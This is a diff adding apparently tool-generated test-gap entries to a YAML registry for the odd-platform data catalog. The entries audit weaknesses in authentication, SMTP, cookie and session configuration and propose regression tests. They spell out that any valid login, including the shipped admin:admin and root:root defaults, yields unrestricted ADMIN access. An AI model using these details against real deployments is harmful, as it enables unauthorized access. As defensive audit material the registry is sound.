@@ -7,19 +7,19 @@ source_monolith_frontmatter:
   sidecar_count: 60
   test_files_indexed: 70
   prompt_version: test-coverage-mapper/0.1.0
-  total_test_gaps: 770
+  total_test_gaps: 790
   gaps_by_criticality:
-    CRITICAL: 130
-    HIGH: 238
-    MEDIUM: 292
-    LOW: 110
+    CRITICAL: 135
+    HIGH: 243
+    MEDIUM: 298
+    LOW: 114
   gaps_by_category:
-    missing-integration: 147
-    missing-security: 223
-    missing-edge-case: 275
+    missing-integration: 152
+    missing-security: 232
+    missing-edge-case: 279
     missing-unit: 82
     sidecar-stale: 3
-    missing-performance: 30
+    missing-performance: 32
     missing-binding: 10
   batch_history:
   - '2026-05-08: TEST-GAP-001..069 — initial 15-sidecar reduction'
@@ -154,7 +154,7 @@ source_monolith_frontmatter:
   - odd-platform java OwnerAssociationRequestController controller-class:OwnerAssociationRequestController
   - odd-platform java DataEntityAttachmentController controller-class:DataEntityAttachmentController
   - odd-platform java DatasetFieldController controller-class:DatasetFieldController
-total_entries: 770
+total_entries: 790
 notice: Rebuilt from detail/ by lineage/_extractor/registry-shard/rebuild_indexes.py.
   The detail files are the source of truth; this index is derived headlines for the
   registry-search subagent.
@@ -17128,3 +17128,1196 @@ test_gaps_index:
   related_refactor_ids: []
   related_doc_gap_ids: []
   detail_path: detail/TEST-GAP-773.yaml
+- gap_id: TEST-GAP-774
+  behaviour: '**CRITICAL — LOGIN_FORM hardcodes ADMIN for EVERY authenticated user
+    AND omits AuthorizationCustomizer wiring. The compound posture means any valid
+    credential pair = unrestricted platform access.** Two file-level facts compose
+    into the operator-facing surface:
+
+
+    (1) **GrantedAuthorityExtractor(true) at line 81** — `mapReactiveUserDetailsService(...)`
+    populates every in-memory `UserDetails` with `grantedAuthorityExtractor.getAuthorities(true)`.
+    The boolean `true` parameter is the `isAdmin` flag; `GrantedAuthorityExtractor.java:13-14`
+    returns `UserProviderRole.ADMIN`. There is NO per-user role distinction in LOGIN_FORM
+    mode — `admin:admin`, `root:root`, and any operator-added entry resolve to identical
+    ADMIN authority.
+
+
+    (2) **AuthorizationCustomizer NOT wired at lines 55-57** — the chain has `.authorizeExchange(spec
+    -> spec.pathMatchers(permittedPaths).permitAll().pathMatchers("/**").authenticated())`
+    and NOTHING ELSE. Sibling `OAuthSecurityConfiguration.java:98` and `LDAPSecurityConfiguration.java:145`
+    BOTH call `new AuthorizationCustomizer(permissionService, extractors)`; LOGIN_FORM
+    does NOT. The `SecurityConstants.SECURITY_RULES:98-355` rule table — every `*_CREATE`,
+    `*_UPDATE`, `*_DELETE`, `*_MANAGE` Permission — is INERT under LOGIN_FORM. An
+    operator who authored Policies + Roles + Owner bindings via the platform UI gets
+    a fully-built RBAC configuration that the live auth chain silently ignores.
+
+
+    **STRENGTHENS existing TEST-GAP-140 (REFACTOR-073 validated) + TEST-GAP-141 (ADMIN-for-every-user)**
+    with the config-class-tier primary source. Prior batch C surfaced these from the
+    config-key-consumer view; this sidecar is the config-class primary source confirming
+    both facts in one place plus the cross-batch composition (S2S also injects ADMIN
+    at line 31-34 of S2sAuthenticationFilter; under LOGIN_FORM + S2S enabled, BOTH
+    cookie-bearing and X-API-Key-bearing requests are operationally indistinguishable
+    — both are ADMIN, both bypass the missing AuthorizationCustomizer).
+
+
+    **Operator-impact scenario** (the operator-cliff failure mode per LSN-001 / LSN-002
+    family): an operator reads the live `/enable-security/authorization` page (WebFetched
+    2026-05-20 status 200 — confirms framework description is silent on which `auth.type`
+    modes wire it), configures Policies + Roles + Owner-association in the UI, runs
+    `auth.type=LOGIN_FORM` (the shipped default credential set is `admin:admin,root:root`
+    per application.yml:37), and assumes the framework gates access. The chain wires
+    no gate; every credential-bearer is ADMIN; every endpoint is reachable. The doc
+    surface gives no warning.
+
+
+    **Test gap shape**: regression-pin asserting (a) form-authenticated user receives
+    ONLY `ADMIN` authority (no per-user distinction), (b) a request from a form-authenticated
+    user with NO Policy/Role association can call `POST /api/permissions/{id}/policies`
+    (a `PERMISSION_*_MANAGE`-gated endpoint per SecurityConstants) and receives HTTP
+    200 (not 403). PINS the intentional absence so a future maintainer wiring AuthorizationCustomizer
+    "to match OAuth/LDAP" trips the test and must explicitly update it.'
+  test_class: missing-security
+  criticality: CRITICAL
+  node_id: ''
+  feature_id: F-008
+  proposed_test_files_count: 0
+  related_refactor_ids: []
+  related_doc_gap_ids: []
+  detail_path: detail/TEST-GAP-774.yaml
+- gap_id: TEST-GAP-775
+  behaviour: '**CRITICAL — Notification SMTP case-sensitivity trap: an operator copy-pasting
+    the live-doc Gmail YAML example (which uses `protocol: SMTP` uppercase) silently
+    bypasses STARTTLS and SMTP AUTH. Credentials may travel in plaintext on every
+    alert email.** Triangulated across code + live docs at the exact line:
+
+
+    - **Code site**: `NotificationConfiguration.java:63` evaluates `if (emailProperties.getProtocol().equals("smtp"))`
+    — case-sensitive lowercase comparison.
+
+    - **TRUE branch (L63-66)**: populates `mail.smtp.auth = emailProperties.getSmtp().getAuth()`
+    AND `mail.smtp.starttls.enable = emailProperties.getSmtp().getStarttls()`.
+
+    - **ELSE branch (L67-69)**: populates ONLY `mail.transport.protocol = emailProperties.getProtocol()`
+    raw; `mail.smtp.auth` and `mail.smtp.starttls.enable` are NEVER SET regardless
+    of operator config.
+
+    - **Live doc evidence** (WebFetch 2026-05-20 status 200 from `/configuration-and-deployment/odd-platform`
+    Gmail example): `protocol: SMTP` (uppercase) — exactly the value that takes the
+    ELSE branch and silently disables both AUTH and STARTTLS.
+
+
+    **Operator-impact scenario** (LSN-001 / LSN-002 family — silent insecure default
+    + cryptic doc coverage):
+
+    1. Operator follows the docs verbatim: `protocol: SMTP`, `smtp.auth: true`, `smtp.starttls:
+    true`, `port: 587`.
+
+    2. Spring binds `EmailSenderProperties.protocol = "SMTP"`.
+
+    3. `mailSender(...)` runs the ELSE branch — Properties bag has only `mail.transport.protocol=SMTP`.
+
+    4. JavaMail''s per-property defaults (when keys are unset): `mail.smtp.auth=false`,
+    `mail.smtp.starttls.enable=false`.
+
+    5. First alert email triggers `transport.connect(...)` — depending on the relay''s
+    policy, the connection either fails plaintext (no AUTH), or sends credentials
+    in plaintext (no STARTTLS), or both.
+
+    6. NO boot warning, NO log line names the case-sensitivity issue. Operator discovers
+    the misconfiguration via either failed delivery OR a security review (worst case:
+    AFTER the credentials have been observed by an MITM).
+
+
+    **Doc-drift confirmation**: the live doc page at `docs.opendatadiscovery.org/configuration-and-deployment/odd-platform`
+    documents the operator-facing YAML AND uses the uppercase `protocol: SMTP` form
+    in the Gmail worked example. The code''s lowercase-only comparison is invisible
+    to the operator reading the docs. This is the SAME class as LSN-001 (LOCAL ephemeral
+    default with caveat-only doc) and LSN-002 (us-east-1 pin with caveat-only doc)
+    — a silent insecure default where the doc carries the surface but the code carries
+    the trap.
+
+
+    **No existing test gap covers this** — verified by grep of test-map/index.yaml:
+    existing TEST-GAP-197..202 cover blank-field validation, null SMTP fields, non-''smtp''
+    protocols (the protocol pass-through to JavaMail), boot-time IllegalArgumentExceptions.
+    NONE address case-sensitivity specifically.
+
+
+    **Test gap shape**: parametrised unit test asserting `mailSender(...)` constructs
+    the Properties bag correctly for BOTH `protocol: "smtp"` (lowercase, expected
+    TRUE branch — auth + starttls populated) AND `protocol: "SMTP"` (uppercase — currently
+    the ELSE branch — a REGRESSION-PIN that documents the silent failure mode AND
+    triggers a fix-recommendation for case-insensitive comparison). The test is the
+    place to author the fix simultaneously: change line 63 to `emailProperties.getProtocol().equalsIgnoreCase("smtp")`
+    and verify both cases produce the same Properties bag.'
+  test_class: missing-security
+  criticality: CRITICAL
+  node_id: ''
+  feature_id: null
+  proposed_test_files_count: 0
+  related_refactor_ids: []
+  related_doc_gap_ids: []
+  detail_path: detail/TEST-GAP-775.yaml
+- gap_id: TEST-GAP-776
+  behaviour: '**CRITICAL — LSN-002 canonical anchor reaffirmed at config-class tier.
+    `MinioAsyncClient.builder()` at MinioConfig.java:19-25 has EXACTLY THREE method
+    calls: `.endpoint(url)`, `.credentials(accessKey, secretKey)`, `.build()`. `.region(...)`
+    is NEVER called. MinIO SDK default region is `us-east-1`. Production AWS S3 deployments
+    outside `us-east-1` fail with `AuthorizationHeaderMalformed` / `PermanentRedirect`
+    on every `putObject` / `getObject`.**
+
+
+    **CONFIRMS PRIMARY SOURCE at the file the LSN-002 retrospective named.** The retrospective
+    said: "constructed `MinioAsyncClient.builder()` without calling `.region(...)`".
+    Verified at MinioConfig.java:19-25 — the builder chain is `.endpoint(url).credentials(accessKey,
+    secretKey).build()`. Zero matches for `attachment.remote.region` across the entire
+    codebase. No `@PostConstruct` guard. No in-code comment cross-referencing LSN-002.
+
+
+    **STRENGTHENS existing TEST-GAP-052** (which already names the LSN-002 region
+    failure mode from the YAML angle). This sidecar provides the config-class-tier
+    primary source: the EXACT builder chain shape with the EXACT line numbers, with
+    the gate-level evidence that REMOTE-mode beans only materialise under `attachment.storage=REMOTE`.
+    Together TEST-GAP-052 + TEST-GAP-776 form a two-tier anchor for the regression
+    pin (YAML config + Java builder).
+
+
+    **Doc-side remediation is HEALTHY** (WebFetched 2026-05-20 status 200 from `/configuration-and-deployment/odd-platform#attachment-storage-configuration`):
+    "AWS S3 region pinned to `us-east-1`. The attachment client is built without an
+    explicit region, so it uses the MinIO Java SDK''s default region (`us-east-1`)
+    for request signing. Against AWS S3 this means only buckets in `us-east-1` work."
+    The OPERATOR knows. The CODE remains unguarded.
+
+
+    **Code-side remediation is UNIMPLEMENTED**:
+
+    - No `attachment.remote.region` config key (grep returns zero matches).
+
+    - No `.region(operatorRegionOrDefault)` call in MinioConfig.java:19-25.
+
+    - No `@PostConstruct` validator on RemoteFileUploadServiceImpl or MinioConfig
+    that warns when a non-MinIO endpoint is configured without a region key.
+
+    - No in-code comment block `// LSN-002 — region defaults to us-east-1 against
+    AWS S3` at the builder call site.
+
+
+    **Test gap shape**: REGRESSION-PIN against the current behaviour — a `@SpringBootTest`
+    driving the bean wiring under `attachment.storage=REMOTE` + valid credentials,
+    asserting (a) `MinioAsyncClient` is registered, AND (b) reflection / proxied-builder
+    introspection confirms `.region(...)` was NEVER called. Until the REFACTOR-027
+    fix lands, the test pins the absence. When the fix lands (operator-configurable
+    `attachment.remote.region` with documented default), the test is the natural place
+    to add the positive contract.
+
+
+    **Integration-level regression pin** (the OPERATOR FAILURE MODE): a `@SpringBootTest`
+    with Testcontainers running MinIO (which ignores the region header — so happy
+    path proves wiring) + a stub AWS S3 SigV4 validator that requires a specific region
+    header — assert the SigV4 signature carries `us-east-1` regardless of operator
+    config. The two-tier test (unit + integration) prevents both a builder refactor
+    (someone adds `.region(...)` with the wrong default) and a deployment surprise.'
+  test_class: missing-security
+  criticality: CRITICAL
+  node_id: ''
+  feature_id: null
+  proposed_test_files_count: 0
+  related_refactor_ids: []
+  related_doc_gap_ids: []
+  detail_path: detail/TEST-GAP-776.yaml
+- gap_id: TEST-GAP-777
+  behaviour: '**CRITICAL (HIGH-by-criticality, escalated by compound risk) — SessionConfiguration
+    wires ZERO cookie-security attributes. No `CookieWebSessionIdResolver` bean, no
+    `SameSite` directive, no `HttpOnly` override, no `Secure` flag setter. Combined
+    with `spring.session.timeout: -1` (sessions never expire) AND LOGIN_FORM''s hardcoded-ADMIN
+    posture (TEST-GAP-774), a stolen session cookie grants permanent ADMIN access
+    to the catalog.**
+
+
+    **Verified by grep at the entire repo level**: `grep CookieWebSession|SameSite|HttpOnly|Secure.*cookie|sessionIdResolver|WebSessionIdResolver`
+    over odd-platform returned ZERO matches. The platform does NOT override Spring
+    WebFlux''s framework defaults at any layer. Spring''s defaults for the session
+    cookie are:
+
+    - `HttpOnly`: true (Spring''s default — mitigates JavaScript-side cookie theft
+    via XSS)
+
+    - `Secure`: NOT SET — the cookie travels in plaintext on HTTP deployments
+
+    - `SameSite`: lax (permits cross-site GET / top-level navigation cookie leakage
+    — sufficient against trivial CSRF but inadequate against state-changing endpoints
+    accepting cookie-auth GET)
+
+    - `Domain` / `Path`: not configured (cookie scoped to the issuing host''s full
+    path)
+
+
+    **Compound risk** (the CRITICAL escalation):
+
+    - Cookie has no `Secure` flag → on HTTP deployments, observable in transit (operator
+    MUST front the platform with TLS + a reverse proxy that adds `Secure` externally).
+
+    - `spring.session.timeout=-1` (application.yml:2-3) → session NEVER expires.
+
+    - LOGIN_FORM mode hardcodes ADMIN authority for every user (TEST-GAP-774).
+
+    - CSRF unconditionally disabled across all four auth modes (TEST-GAP-146).
+
+    - No in-platform session revocation mechanism (live-doc verbatim 2026-05-20: "does
+    not support rotation, session revocation, or MFA").
+
+
+    Result: a session cookie compromised via HTTP transit OR via XSS (CSP not asserted)
+    is valid until JVM restart, grants ADMIN authority across every endpoint, with
+    no platform-side revocation mechanism. The compound posture is the LSN-001/LSN-002-class
+    shape: silent insecure default + caveat-only / silent doc coverage + no fail-fast.
+
+
+    **STRENGTHENS existing TEST-GAP-143** (session-cookie security from LoginForm-tier
+    view). This sidecar is the SessionConfiguration config-class primary source —
+    confirms the absence at the *session backing store* layer (where any cookie override
+    would naturally live, regardless of auth mode), broader than just LOGIN_FORM.
+    The cookie defaults apply to OAUTH2 and LDAP modes too.
+
+
+    **Live doc drift**: WebFetched 2026-05-20 status 200 from `/configuration-and-deployment/odd-platform#select-session-provider`
+    covers session storage and timeout but does NOT name the cookie attributes. Operators
+    relying on framework defaults have no guidance.
+
+
+    **Test gap shape**: integration test asserting the `Set-Cookie` header on a successful
+    form-login response carries `HttpOnly` AND `Secure=false` (the framework default
+    with no override) AND `SameSite=Lax`. PINS the current state so a future fix (adding
+    a `CookieWebSessionIdResolver` bean with `HttpOnly + Secure + SameSite=Strict
+    + Domain + Path`) is a deliberate test update. Pair with a second test asserting
+    that a non-TLS deployment exposes the cookie in plaintext (set up HTTP-only TestContainer;
+    observe Set-Cookie in HTTP response; confirm no `Secure` attribute).'
+  test_class: missing-security
+  criticality: CRITICAL
+  node_id: ''
+  feature_id: null
+  proposed_test_files_count: 0
+  related_refactor_ids: []
+  related_doc_gap_ids: []
+  detail_path: detail/TEST-GAP-777.yaml
+- gap_id: TEST-GAP-778
+  behaviour: '**CRITICAL (cross-cutting) — NO integration test exists that verifies
+    each of the four `auth.type` modes (DISABLED / LOGIN_FORM / OAUTH2 / LDAP) produces
+    the EXPECTED authorization-framework wiring posture AND the EXPECTED authority
+    for an authenticated user.** This is the systemic absence underlying every per-mode
+    CRITICAL pin (TEST-GAP-140, TEST-GAP-141, TEST-GAP-774, TEST-GAP-149) — none individually
+    catches the cross-mode quartet contract.
+
+
+    **The four-mode quartet contract** (assembled from the four sidecars):
+
+    | auth.type | AuthorizationCustomizer | Authority for authed user | RBAC enforced?
+    | Cookie expiry | Test coverage |
+
+    |---|---|---|---|---|---|
+
+    | DISABLED | NOT wired | every request bypassed, no auth | NO (read-collaborative
+    wide-open) | n/a (no session) | ZERO |
+
+    | LOGIN_FORM | NOT wired | ADMIN (hardcoded, every user) | NO (wide-open) | never
+    expires | ZERO |
+
+    | OAUTH2 | wired (line 98) | per-OIDC-claim from `ODD_USER_ROLE_CLAIM` | YES |
+    never expires | ZERO |
+
+    | LDAP | wired (line 145) | per-LDAP-attribute extraction | YES | never expires
+    | ZERO |
+
+
+    The compound finding is the ASYMMETRY: OAUTH2 + LDAP wire the authorization framework,
+    LOGIN_FORM + DISABLED do not. A maintainer adding `.authorizeExchange(new AuthorizationCustomizer(...))`
+    to LOGIN_FORM "to match OAuth/LDAP" silently flips the posture from wide-open
+    (intentional per docs) to RBAC-enforced — breaking existing deployments. A maintainer
+    REMOVING the customizer from OAUTH2 "to simplify" silently flips it from RBAC
+    to wide-open. No test catches either change.
+
+
+    **Cross-reference to the per-mode pins** (already cataloged but isolated):
+
+    - TEST-GAP-140 + TEST-GAP-774 (LOGIN_FORM no AuthorizationCustomizer)
+
+    - TEST-GAP-141 (LOGIN_FORM ADMIN-for-every-user)
+
+    - TEST-GAP-148 (OAUTH2 bean-graph contract — NO test asserts AuthorizationCustomizer
+    is wired)
+
+    - TEST-GAP-149 (S2S composes with all three interactive modes producing ADMIN)
+
+    - TEST-GAP-3212 / batch H DISABLED mode read-collaborative posture pin
+
+
+    **What the quartet test catches that none of the above does in isolation**:
+
+    - A future refactor moving authorization wiring into a shared utility class (well-intentioned
+    dedup) that silently changes the OAUTH2 + LDAP behaviour while leaving LOGIN_FORM/DISABLED
+    untouched.
+
+    - A future change to `SecurityConstants.WHITELIST_PATHS` that breaks LOGIN_FORM''s
+    HAND-ROLLED permittedPaths divergence (line 49-51 vs SecurityConstants.java:95-96
+    — confirmed-divergent in the sidecar; see also TEST-GAP-147).
+
+    - A future change to `GrantedAuthorityExtractor.getAuthorities(isAdmin)` semantics
+    — LOGIN_FORM hardcodes `true`, OAUTH2 + LDAP compute per-user, DISABLED never
+    calls it.
+
+    - A `Provider.java` enum addition (e.g., adding OKTA, KEYCLOAK) that needs handler
+    registration in OAuth2 mode but should not affect the other three modes — this
+    test confirms each mode''s bean graph is independent.
+
+
+    **Test gap shape**: parametrised `@SpringBootTest` running 4 boot cycles (one
+    per `auth.type`), each asserting THE SAME contract:
+
+    1. Exactly ONE `SecurityWebFilterChain` bean is registered.
+
+    2. `AuthorizationCustomizer` bean presence matches the expected mode (present
+    in OAUTH2/LDAP; absent in LOGIN_FORM/DISABLED).
+
+    3. An authenticated user''s `SecurityContext.getAuthentication().getAuthorities()`
+    matches the expected pattern (ADMIN-hardcoded for LOGIN_FORM; per-OIDC-claim for
+    OAUTH2; per-LDAP-attribute for LDAP; bypassed for DISABLED).
+
+    4. A request to an RBAC-gated endpoint (e.g., `POST /api/permissions/{id}/policies`)
+    without the gating permission returns 200 (LOGIN_FORM/DISABLED — wide-open) or
+    403 (OAUTH2/LDAP — RBAC-enforced).
+
+    5. The five permit-all paths (`/actuator/health`, `/favicon.ico`, `/ingestion/entities`,
+    `/ingestion/datasources`, `/api/slack/events`) are reachable WITHOUT authentication
+    under each mode (compatibility floor).'
+  test_class: missing-integration
+  criticality: CRITICAL
+  node_id: ''
+  feature_id: F-008
+  proposed_test_files_count: 0
+  related_refactor_ids: []
+  related_doc_gap_ids: []
+  detail_path: detail/TEST-GAP-778.yaml
+- gap_id: TEST-GAP-779
+  behaviour: '**HIGH — `spring.session.timeout=-1` (shipped default at application.yml:2-3)
+    makes sessions never expire across ALL three session providers, which compounds
+    with the hourly housekeeping job into a silent no-op.** Sidecar primary-source
+    confirms three composing facts:
+
+
+    (1) **`spring.session.timeout=-1` is the shipped default** (application.yml:2-3):
+    the value applies to all three session providers (IN_MEMORY / INTERNAL_POSTGRESQL
+    / REDIS). Spring''s `MaxInactiveInterval` for the session is set to whatever the
+    SessionStore computes from this value — and `JooqSessionRepository.java:138-148`
+    confirms the per-record `expiry_time` column is computed as `lastAccessedTime
+    + maxInactiveInterval.toSeconds()`. When `maxInactiveInterval` is unset or negative,
+    the expiry is effectively never reached.
+
+
+    (2) **Housekeeping job uses `expiry_time < now()` predicate** at PostgreSQLSessionHousekeepingJob.java:30.
+    Combined with (1), the predicate NEVER matches — the housekeeping job is a NO-OP
+    under the shipped defaults. The `SPRING_SESSION` + `SPRING_SESSION_ATTRIBUTES`
+    tables grow monotonically.
+
+
+    (3) **No log warning, no operator-visible signal**: SessionConfiguration carries
+    no `@Slf4j`, no boot-time `log.warn("spring.session.timeout=-1 — sessions never
+    expire")` (verified via the sidecar''s `dependencies_semantic.requires-config`
+    block + grep for `log.warn|log.info` in SessionConfiguration.java — 0 matches).
+    An operator inspecting `/actuator/env` sees the value but no compound warning.
+
+
+    **Operator-impact scenario** (LSN-001 family — silent monotonic growth):
+
+    - **IN_MEMORY**: the `ConcurrentHashMap` grows monotonically until JVM restart.
+    For a high-RPS deployment (1000 unique users/day × 365 days × baseline 5 KB per
+    session), heap pressure surfaces as GC pauses, then OOM after weeks/months.
+
+    - **INTERNAL_POSTGRESQL**: the `SPRING_SESSION` table grows monotonically. The
+    shipped Flyway migration V0_0_41 creates no `EXPIRY_TIME` index that would help;
+    full-table scan on session lookup degrades latency.
+
+    - **REDIS**: the Redis key-space grows monotonically. Operators relying on Redis
+    `maxmemory-policy` default `noeviction` see OOM-on-write failures.
+
+
+    All three are SILENT — no log line, no metric, no actuator-health alert. The operator
+    discovers the issue when something breaks.
+
+
+    **Compound risk with TEST-GAP-777** (no cookie security): a never-expiring session
+    that grants permanent ADMIN access (LOGIN_FORM hardcoded admin per TEST-GAP-774)
+    means cookie theft has no time bound. The compound posture is the LSN-001 / LSN-002
+    / cross-batch-Q (REFACTOR-417 session-cookie permanence) all in one place.
+
+
+    **Test gap shape**: integration test asserting (a) the shipped default `spring.session.timeout`
+    is `-1`, (b) the housekeeping job''s `expiry_time < now()` predicate matches NO
+    rows when sessions are written under default config, (c) the JOOQ SQL produces
+    a never-matching SELECT plan (verifiable via `EXPLAIN ANALYZE` or via test-side
+    row count after housekeeping run). PINS the compound risk so a future change to
+    `spring.session.timeout=86400` (24h, the recommended-production-default) AS a
+    deliberate update triggers test failure and forces explicit human review.'
+  test_class: missing-integration
+  criticality: HIGH
+  node_id: ''
+  feature_id: null
+  proposed_test_files_count: 0
+  related_refactor_ids: []
+  related_doc_gap_ids: []
+  detail_path: detail/TEST-GAP-779.yaml
+- gap_id: TEST-GAP-780
+  behaviour: "**HIGH — PostgreSQLSessionHousekeepingJob is the SOLE `@Scheduled` job\
+    \ in the entire codebase that does NOT use `@SchedulerLock` / advisory-lock-based\
+    \ leader election. On a multi-instance INTERNAL_POSTGRESQL deployment, EVERY instance\
+    \ runs the housekeeping job hourly, multiplying DB load by N replicas.** Sidecar\
+    \ primary-source confirms the asymmetry:\n\n- **PostgreSQLSessionHousekeepingJobHandler.java:13**\
+    \ declares `@Scheduled(fixedRate = 1, timeUnit = TimeUnit.HOURS)` — NO `@SchedulerLock`\
+    \ annotation.\n- **Contrast** (cross-batch evidence already in concepts.yaml):\n\
+    \  - `notifications.wal.advisory-lock-id` (application.yml:177) — leader-election\
+    \ on notification subscriber.\n  - `odd.activity.partition-advisory-lock-id` (application.yml:198)\
+    \ — leader-election on partition manager.\n  - `datacollaboration.sender.advisory-lock-id`\
+    \ + `datacollaboration.receive-event.advisory-lock-id` (application.yml:201-202)\
+    \ — leader-election on data-collaboration jobs.\n  - `HousekeepingJobManager.java:18`\
+    \ uses Postgres advisory-lock leader-election for the platform-wide housekeeping\
+    \ cycle (SearchFacetsHousekeepingJob et al — per F-010).\n- **Session housekeeping\
+    \ is the SOLE outlier** — verified via grep `@SchedulerLock` over odd-platform-api/src/main/java;\
+    \ the annotation is present on 4 jobs; absent on PostgreSQLSessionHousekeepingJobHandler.\n\
+    \n**Operator-impact scenario**:\n- Single-instance deployment: housekeeping runs\
+    \ once per hour, DELETE WHERE `expiry_time < now()` executes once. Idempotent\
+    \ SQL — first run deletes the matching rows, no harm.\n- 5-instance deployment:\
+    \ housekeeping runs 5 times per hour across the 5 replicas. The DELETE SQL is\
+    \ idempotent (the second run sees no rows matching that the first hasn't already\
+    \ deleted), so CORRECTNESS is preserved. But the DB load is 5× the intended rate.\
+    \ For a busy `SPRING_SESSION` table, the DELETE + index maintenance + WAL writes\
+    \ amplify.\n- 10-instance deployment: 10× load. Combined with `spring.session.timeout=-1`\
+    \ (TEST-GAP-779 — predicate never matches, so the DELETE has no rows to scan but\
+    \ still incurs the planning + lock-acquisition cost), the DB receives 240 useless\
+    \ DELETE statements per day per 10 replicas.\n\n**Correctness is OK, performance\
+    \ is NOT.** Idempotency is a CONSEQUENCE, not an INVARIANT — a future change adding\
+    \ side-effects to the housekeeping job (e.g., emitting an activity event for each\
+    \ deletion, incrementing a metric counter, persisting an audit row) immediately\
+    \ becomes load-bearing. Without leader-election, N replicas duplicate the side-effects\
+    \ N times.\n\n**Architectural-consistency gap**: the platform's other `@Scheduled`\
+    \ jobs ALL use either `@SchedulerLock` (ShedLock library) or Postgres advisory\
+    \ locks. The session-housekeeping outlier is an UNDOCUMENTED architectural inconsistency\
+    \ that future maintainers will notice and either fix (good) or replicate (bad\
+    \ — establishing a precedent for unguarded `@Scheduled` jobs).\n\n**Test gap shape**:\
+    \ parametrised test running a `@SpringBootTest` under N=2 instances (or equivalent\
+    \ — two separate ApplicationContexts in the same JVM sharing a Testcontainers\
+    \ PG) and asserting that ONLY ONE instance's housekeeping job acquires the advisory\
+    \ lock per scheduled tick. The test is CURRENTLY FAILING (no lock exists) — it\
+    \ pins the gap. The fix is one annotation: `@SchedulerLock(name = \"sessionHousekeepingJob\"\
+    , lockAtLeastFor = \"PT55M\", lockAtMostFor = \"PT55M\")` on the handler."
+  test_class: missing-integration
+  criticality: HIGH
+  node_id: ''
+  feature_id: null
+  proposed_test_files_count: 0
+  related_refactor_ids: []
+  related_doc_gap_ids: []
+  detail_path: detail/TEST-GAP-780.yaml
+- gap_id: TEST-GAP-781
+  behaviour: '**HIGH — SessionConfiguration''s IN_MEMORY default (the shipped value
+    `session.provider: IN_MEMORY` per application.yml:30) breaks the `/ingestion/datasources`
+    collector-identity bridge in multi-instance deployments WITHOUT sticky sessions.
+    The platform does NOT fail-fast or warn on this misconfiguration class.** This
+    is the THIRD-tier primary source (after the controller + repository tiers — REFACTOR-419)
+    of the cluster-fragility finding.
+
+
+    **Concretely**:
+
+    1. `IngestionDataSourceFilter.java:36-38` writes `SessionConstants.COLLECTOR_ID_SESSION_KEY`
+    into the WebSession backed by whichever provider SessionConfiguration wires.
+
+    2. `IngestionController.createDataSource` at IngestionController.java:50-58 reads
+    the same key back.
+
+    3. Under `session.provider=IN_MEMORY` (the shipped default), the WebSession lives
+    in the JVM''s `ConcurrentHashMap` — per-process, NOT replicated across instances.
+
+    4. A load balancer WITHOUT sticky sessions routes the second request (the controller''s
+    read) to a DIFFERENT instance than the first (the filter''s write).
+
+    5. The second instance sees a NULL `collectorId` session attribute and throws
+    `IllegalStateException("Collector id is null")` at line 54 — propagating as HTTP
+    500.
+
+    6. The collector retries → may hit a third instance → same failure → exponential
+    backoff → operator-visible collector outage.
+
+
+    **The ADR is implicit**: this sidecar''s `related_implicit_adrs` block names ADR-CANDIDATE-141
+    (Collector identity via WebSession attribute, not Spring Security Principal).
+    That ADR''s THIRD facet is rooted at SessionConfiguration.java:46-49 — the IN_MEMORY
+    default. Together with REFACTOR-419 (cluster-fragility, HIGH severity, batch P
+    + strengthen-batch-R), the cluster-fragility surface is the canonical operator-cliff
+    scenario.
+
+
+    **Compound risk** (cross-batch composition):
+
+    - This is the SAME class as LSN-001 (LOCAL ephemeral attachment storage default
+    — silent insecure default) and LSN-002 (us-east-1 region default — silent operational
+    failure). All three are "shipped-as-default" choices with no boot-time warning
+    when the operator''s deployment-shape contradicts the default''s assumption.
+
+    - The `/ingestion/datasources` path is also UNAUTHENTICATED (whitelisted in `SecurityConstants.WHITELIST_PATHS:95-96`
+    — verified at primary source by the SessionConfiguration sidecar''s `dependencies_semantic.coupling-with-other-config-classes`
+    block + the LoginForm sidecar''s permit-all paths block). The combination means:
+    the collector''s identity-carrying mechanism is BOTH (a) provider-dependent (cluster-fragile)
+    AND (b) unauthenticated (no SecurityContext fallback).
+
+
+    **STRENGTHENS REFACTOR-419 with the CONFIG-CLASS PRIMARY SOURCE.** Prior batches
+    surfaced this from the filter + controller tiers; this sidecar pins the shipped
+    DEFAULT that drives the fragility (application.yml:30 `provider: IN_MEMORY`).
+    The three-tier triangulation (controller + repository + config-class) is now complete.
+
+
+    **Test gap shape**: integration test running the full flow on a SIMULATED multi-instance
+    deployment (two `@SpringBootTest` ApplicationContexts in the same JVM sharing
+    a load-balancer-style request router). Confirm:
+
+    - Under `session.provider=IN_MEMORY` + non-sticky routing: `/ingestion/datasources`
+    2nd request → HTTP 500.
+
+    - Under `session.provider=INTERNAL_POSTGRESQL` + non-sticky routing: succeeds
+    (cluster-safe).
+
+    - Under `session.provider=REDIS` + non-sticky routing: succeeds (cluster-safe).
+
+
+    The test PINS the cluster-fragility shape AND documents the cluster-safe providers
+    as alternatives.'
+  test_class: missing-integration
+  criticality: HIGH
+  node_id: ''
+  feature_id: F-008
+  proposed_test_files_count: 0
+  related_refactor_ids: []
+  related_doc_gap_ids: []
+  detail_path: detail/TEST-GAP-781.yaml
+- gap_id: TEST-GAP-782
+  behaviour: '**HIGH — `@Value("${notifications.message.downstream-entities-depth}")`
+    at NotificationConfiguration.java:123 has NO `:default` fallback. Operators who
+    turn on `notifications.enabled=true` but forget to set the depth knob crash boot
+    with Spring''s generic `Could not resolve placeholder` BeanCreationException —
+    a confusing failure mode distinct from the file''s other validated paths.**
+
+
+    **Asymmetric `@Value` defaults across the same file** (sidecar primary-source
+    confirms):
+
+    - `notifications.message.downstream-entities-depth` at L123 → `@Value("${notifications.message.downstream-entities-depth}")`
+    — NO default → BeanCreationException if unset.
+
+    - `odd.platform-base-url` at L105 → `@Value("${odd.platform-base-url:http://localhost:8080}")`
+    — HAS default → silent fallback.
+
+    - All four channel triggers (`notifications.receivers.{email.sender, slack.url,
+    webhook.url}`) use `@ConditionalOnProperty` — NO BeanCreationException, just bean-not-registered.
+
+
+    The asymmetry is unintentional inconsistency. `application.yml:174-175` SHIPS
+    the default `notifications.message.downstream-entities-depth: 1` so an UNMODIFIED-config
+    deployment works. But an operator overriding `application.yml` (e.g., via Helm
+    values, ConfigMap merge, env-var substitution) and turning on `notifications.enabled=true`
+    without supplying the depth value crashes Spring boot.
+
+
+    **Operator-impact scenario**:
+
+    1. Operator builds a custom Helm values file based on the docs.
+
+    2. Operator sets `notifications.enabled=true` per the live `/configuration-and-deployment/odd-platform`
+    page.
+
+    3. Operator forgets to set `notifications.message.downstream-entities-depth` (the
+    docs DO list it but the operator misses it).
+
